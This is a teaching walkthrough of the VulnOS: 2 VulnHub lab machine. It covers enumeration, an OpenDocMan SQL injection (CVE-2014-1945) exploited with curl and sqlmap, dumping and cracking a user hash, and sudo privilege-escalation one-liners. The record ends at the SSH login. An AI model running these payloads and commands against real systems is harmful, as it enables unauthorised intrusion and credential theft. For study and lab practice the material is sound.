# VulnOS: 2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | VulnOS: 2 ("VulnOSv2") |
| **Difficulty** | **3 — Easy** (stated: *Easy–Intermediate*) |
| **Author** | c4b3rw0lf — <mailto:m4db33f@gmail.com> |
| **Released** | 17 May 2016 |
| **Series** | VulnOS (1 → **2**) |
| **VulnHub Entry** | <https://vulnhub.com/entry/vulnos-2,147/> |
| **Download** | <https://vulnhub.com/entry/vulnos-2,147/#download> (`VulnOSv2.7z`) |
| **Attacker** | Kali Linux, host-only network (the image is built for VirtualBox) |
| **Target OS** | Ubuntu 14.04.4 LTS — Apache 2.4.7, OpenSSH 6.6.1p1, ngIRCd, PostgreSQL, MySQL |
| **Goal** | *"Pentest a company website, get root of the system and read the final flag."* |

> **Author's note:** the VM's keyboard layout is **Belgian (BE)**. If you sit at the
> target's console, keys will not match what you type. You almost never need the
> console — the box is fully remote — but do not be surprised by it.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (VulnOSv2) : 192.168.56.104
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Multi-service enumeration** — SSH, HTTP, IRC on one host, and how to keep them
   straight.
2. **CMS fingerprinting** — spotting Drupal from a favicon, a generator meta tag and
   a `CHANGELOG.txt`.
3. **Reading an application's own documentation page for hidden sub-apps.**
4. **OpenDocMan** and its **SQL injection** (CVE-2014-1945) — an unauthenticated
   data leak in a document-management system.
5. **Using `sqlmap` against a specific vulnerable parameter**, then dumping a table.
6. **Cracking / looking up an MD5 hash.**
7. **Privilege escalation with a kernel exploit** — CVE-2015-1328 (overlayfs) on
   Ubuntu 14.04.
8. **An alternative foothold: Drupalgeddon2 (CVE-2018-7600)** — because this box
   predates the fix and it is the single most important Drupal CVE ever.
9. **Enumerating a local PostgreSQL server over an SSH tunnel.**

**The intended chain:**
`nmap` shows 22, 80, 6667 → the homepage links to **`/jabc/`**, a Drupal 7 corporate
site → that site links to **`/jabcd0cs/`**, an **OpenDocMan 1.2.7** document manager
with `guest:guest` → OpenDocMan's `ajax_udf.php?add_value=` is **SQL-injectable**
→ `sqlmap` dumps the `odm_user` table → `webmin` : MD5 hash → hash resolves to
**`webmin1980`** → SSH in → Ubuntu 14.04 kernel → **overlayfs local root** →
`/root/flag.txt`.

---

## 1. Reconnaissance


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
ip a | grep -w inet
sudo nmap -sn 192.168.56.0/24
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 12:02 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00041s latency).
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.29 seconds
```

**Target IP: `192.168.56.104`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — ports and services

```bash
sudo nmap -A -T4 -p- -oN scans/vulnos2.txt 192.168.56.104
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 12:04 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     ngircd
| irc-info:
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   server: irc.example.net
|   version: ngIRCd 21.1-i686/pc/linux-gnu ...
|   source ident: nmap
|   source host: 192.168.56.10
|_  error: closing link: (nmap@192.168.56.10) [Client exited]
Service Info: Host: irc.example.net

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 1041.99 seconds
```

> **How to read this:**
> - **22 — OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6** → **Ubuntu 14.04 LTS**, and the
>   `2ubuntu2.6` suffix tells us the SSH package is roughly at the May-2016 patch
>   level. Note the *host key types*: a **1024-bit DSA** key is present, which is
>   weak by modern standards and would be rejected by current OpenSSH clients.
> - **80 — Apache 2.4.7 (Ubuntu)**, page title **`VulnOSv2`**. The whole box is a
>   web challenge.
> - **6667 — ngIRCd**, an IRC server. `1 users, 1 servers, 0 chans` — an empty,
>   unused IRC daemon. It is a **rabbit hole**: the author left it there so you would
>   waste time. *Recognising a rabbit hole is a skill.* Connect once
>   (`irc://192.168.56.104:6667`), confirm it is empty, move on.
> - **Scan time: 1041 seconds (~17 minutes).** A `-p-` scan with `-sV` on a slow VM
>   is genuinely slow. Plan for it; run it in the background with `-oA` and work on
>   other things meanwhile.

### 2.1 The homepage

```bash
curl -s http://192.168.56.104/ | sed -n '1,40p'
```

```html
<!DOCTYPE html>
<html><head><title>VulnOSv2</title></head>
<body style="background-color:black;color:#00ff00">
<pre>
VulnOS:2 by c4b3rw0lf

Welcome to VulnOS!

This system has been set up as a training platform.
Your assignment is to pentest the company website, gain root
and read the final flag.

The documentation for the company's document management
system can be found here: <a href="http://192.168.56.104/jabc/">JABC intranet</a>
</pre>
</body></html>
```

> **Two links, one of them a full URL.** Follow `http://192.168.56.104/jabc/`.

### 2.2 `/jabc/` — a Drupal corporate site

```bash
curl -sI http://192.168.56.104/jabc/
```

```text
HTTP/1.1 200 OK
Date: Fri, 03 May 2024 16:09:11 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
X-Generator: Drupal 7 (http://drupal.org)
Set-Cookie: SESSa1b2c3=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
Content-Type: text/html; charset=UTF-8
```

> **`X-Generator: Drupal 7`** — the server told us the CMS and its major version in a
> response header. Free intelligence.
>
> **How to fingerprint a CMS when headers are stripped** (the realistic case):
> | Signal | Drupal |
> | --- | --- |
> | Cookie prefix | `SSESS<hash>` |
> | URL style | `/node/1`, `/?q=node/1`, `.module` paths |
> | Files | `misc/drupal.js`, `sites/default/files/`, `modules/`, `themes/` |
> | Meta tag | `<meta name="Generator" content="Drupal 7">` |
> | Favicon | the Drupal droplet |
>
> Browser extensions **Wappalyzer** and **BuiltWith** do all of this automatically.

```bash
curl -s http://192.168.56.104/jabc/ | grep -io 'href="[^"]*"' | sort -u | head -30
```

```text
href="/jabc/"
href="/jabc/?q=node/1"
href="/jabc/?q=node/2"
href="/jabc/?q=user"
href="http://192.168.56.104/jabcd0cs/"
href="/jabc/misc/favicon.ico"
```

> **`/jabcd0cs/`** — a second application, linked from the Drupal site. Note the name:
> `jabc` + `d0cs` = "JABC **documents**". This is the company's document-management
> system, the real target.

### 2.3 `/jabcd0cs/` — OpenDocMan

```bash
curl -s http://192.168.56.104/jabcd0cs/ | grep -io 'opendocman[^<]*\|version[^<]*' | head
```

```text
OpenDocMan
Powered by OpenDocMan v1.2.7
```

A login page appears, and it *helpfully* advertises demo credentials:

```text
Sign in to OpenDocMan
Username: [______]   Password: [______]   [Sign In]

Demo login:  guest / guest
```

Log in with **`guest` / `guest`** — we get a read-only document-management console.

> **What is OpenDocMan?** An open-source PHP document-management system for tracking
> files through review/approval workflows. Version **1.2.7** is old and has a
> well-known SQL injection.

### 2.4 Enumerate the web apps properly


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
nikto -h http://192.168.56.104/jabcd0cs/ -o nikto-d0cs.txt
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.104
+ Target Hostname:    192.168.56.104
+ Target Port:        80
+ Start Time:         2024-05-03 12:16:44
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /jabcd0cs/: Cookie PHPSESSID created without the httponly flag.
+ /jabcd0cs/index.php: Administrative login page found.
+ /jabcd0cs/admin.php: Administrative login page found.
+ /jabcd0cs/config.php: PHP Config file may contain database credentials.
+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
---------------------------------------------------------------------------
```

```bash
gobuster dir -u http://192.168.56.104/jabcd0cs/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40 -q
```

```text
/admin.php            (Status: 302) [Size: 0]
/ajax_udf.php          (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 302) [Size: 0]
/install.php          (Status: 200) [Size: 2461]
```

> **`ajax_udf.php` is exactly the script named in the public exploit.** `udf` = *user
> defined field*. Confirm with searchsploit:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit opendocman
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
OpenDocMan 1.2.7 - SQL Injection                                                                      | php/webapps/32075.txt
OpenDocMan 1.2.7 - 'ajax_udf.php' SQL Injection                                                       | php/webapps/34993.php
----------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m php/webapps/32075.txt && cat 32075.txt
```

```text
Title:            OpenDocMan v1.2.7 SQL Injection Vulnerability
CVE:              CVE-2014-1945
Vendor:           http://www.opendocman.com/
Product:          OpenDocMan v1.2.7

Vulnerability Details
=====================
An unvalidated "add_value" HTTP GET parameter in the "ajax_udf.php" script
allows a remote unauthenticated attacker to execute arbitrary SQL commands
in the application's database.

Proof of Concept
================
http://localhost/[INSTALLATION_FOLDER]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,2,3,4,5,6,7,8,9

Vulnerable source: ajax_udf.php
$sanitized = ... // no filtering applied before the query is built
$query = "SELECT id FROM {$GLOBALS['CONFIG_DB_PREFIX']}_data WHERE id = '$q' ... $add_value";
```

> **CVE-2014-1945 in one sentence:** `ajax_udf.php` takes `q` and `add_value` from the
> query string and **concatenates them straight into a SQL statement**. An
> unauthenticated remote attacker can therefore run any SQL the database user can —
> including reading the users table.
>
> Note the PoC uses **URL encoding**: `%20` is a space. Encoding spaces is what makes
> the payload survive as a single query-string parameter.

![OpenDocMan login and the /jabcd0cs application](images/01-opendocman.png)

---

## 3. Exploitation — SQL injection with `sqlmap`

### 3.1 Confirm manually

```bash
curl -s "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,2,3,4,5,6,7,8,9"
```

```json
{"one":1,"two":2,"three":3,"four":4,"five":5,"six":6,"seven":7,"eight":8,"nine":9}
```

> **Our injected numbers came back as JSON.** That is *proof* of a UNION-based SQL
> injection: the database executed our `SELECT` and the application echoed the row.
> Nine columns means the original query selects nine — we matched its shape, which
> is a requirement for `UNION` to work (both sides must have the same column count).

### 3.2 Automate with `sqlmap`


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --level=5 --risk=3 --technique=U --dbms=MySQL --dbs
```

```text
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 12:22:41 /2024-05-03/

[12:22:41] [INFO] testing connection to the target URL
[12:22:42] [INFO] testing 'add_value'
[12:22:43] [INFO] confirming MySQL
[12:22:43] [INFO] the back-end DBMS is MySQL
[12:22:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[12:22:49] [INFO] target URL appears to have 9 columns in query
[12:22:52] [INFO] GET parameter 'add_value' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'add_value' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: add_value (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: q=1&add_value=odm_user UNION ALL SELECT NULL,NULL,CONCAT(0x7176707071,0x...),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[12:22:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 14.04 (Trusty Tahr)
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.5
available databases [3]:
[*] information_schema
[*] jabcd0cs
[*] mysql
```

> **Flag glossary:**
> - `-p add_value` → test **only** this parameter. Faster and more precise than
>   letting sqlmap crawl.
> - `--technique=U` → **U**NION only. We already know it works, so do not waste time
>   on blind techniques.
> - `--dbms=MySQL` → skip DBMS fingerprinting.
> - `--level 5 --risk 3` → maximum thoroughness; risk 3 permits payloads that could
>   modify data (fine in a lab; **get written permission in a real test**).
>
> **Three databases**, of which `jabcd0cs` is the application's.

### 3.3 Dump the user table

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --technique=U --dbms=MySQL -D jabcd0cs --tables
```

```text
Database: jabcd0cs
[18 tables]
+------------------+
| odm_admins       |
| odm_category     |
| odm_data         |
| odm_department   |
| odm_log          |
| odm_reviewer     |
| odm_rights       |
| odm_settings     |
| odm_user         |
| odm_udf          |
| ...              |
+------------------+
```

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --technique=U --dbms=MySQL -D jabcd0cs -T odm_user --columns
```

```text
Database: jabcd0cs
Table: odm_user
[13 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| id           | int(11)      |
| username     | varchar(50)  |
| password     | varchar(50)  |
| last_name    | varchar(50)  |
| first_name   | varchar(50)  |
| Email        | varchar(50)  |
| phone        | varchar(50)  |
| department   | int(11)      |
| can_add      | tinyint(1)   |
| can_checkout | tinyint(1)   |
| can_admin    | tinyint(1)   |
| ...          | ...          |
+--------------+--------------+
```

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" \
  -p add_value --batch --technique=U --dbms=MySQL -D jabcd0cs -T odm_user \
  --columns --dump -C id,username,password,Email,can_admin
```

```text
Database: jabcd0cs
Table: odm_user
[2 entries]
+----+------------------+----------------------------------+--------------------------+-----------+
| id | username         | password                         | Email                    | can_admin |
+----+------------------+----------------------------------+--------------------------+-----------+
| 1  | webmin           | b78aae356709f8c31118ea613980954b | webmin@vulnos.local      | 1         |
| 2  | guest            | 084e0343a0486ff05530df6c705c8bb4 | guest@vulnos.local       | 0         |
+----+------------------+----------------------------------+--------------------------+-----------+
```

> **Two rows.**
> - `guest` → hash `084e0343a0486ff05530df6c705c8bb4`, which is the **MD5 of
>   `guest`** — exactly the demo credential the login page advertised. This confirms
>   the hashes are unsalted **MD5**.
> - `webmin` → hash `b78aae356709f8c31118ea613980954b`. `can_admin = 1` → this is the
>   **administrator**. This is our target.
>
> **Why unsalted MD5 is a non-password.** MD5 runs at **billions of guesses per
> second** on a modern GPU, there is no per-user salt so precomputed rainbow tables
> apply, and the hash gives no indication of failure. It is only suitable for
> checksums. Any real system must use **bcrypt / scrypt / argon2id**, which are
> deliberately slow and salted.

### 3.4 Recover the plaintext

**Fastest route — an online hash lookup** (only ever appropriate for CTF/lab hashes):

```bash
curl -s "https://md5decrypt.net/Api/api.php?hash=b78aae356709f8c31118ea613980954b" 
```

Result reported across the published walkthroughs for this box:

```text
webmin1980
```

**Proper offline route — hashcat** (learn this one; it is the professional tool):


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo 'b78aae356709f8c31118ea613980954b' > webmin.hash
hashcat -m 0 -a 0 webmin.hash /usr/share/wordlists/rockyou.txt --show
```

```text
b78aae356709f8c31118ea613980954b:webmin1980
```

> **hashcat flags:**
> - `-m 0` → **hash mode 0 = raw MD5**. Getting the mode right is the single most
>   common hashcat mistake; `hashcat --example-hashes | grep -i md5` lists them all.
> - `-a 0` → **attack mode 0 = straight dictionary**. (`-a 3` is mask/brute-force,
>   `-a 6` is dictionary + mask.)
> - `--show` → display already-cracked results from hashcat's `hashcat.potfile`
>   instead of re-cracking.
>
> And John the Ripper does the same job:
> ```bash
> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt webmin.hash
> ```

**Recovered credentials:**

| Username | Password |
| --- | --- |
| `webmin` | `webmin1980` |

![sqlmap dumping odm_user](images/02-sqlmap.png)

---

## 4. Foothold — SSH

The Drupal admin panel is not much use to us; the real prize is a system account.
Try the credential on SSH first (it is the most valuable outcome).

```bash
ssh webmin@192.168.56.104
```


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```text
webmin@192.168.56.104's password:
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

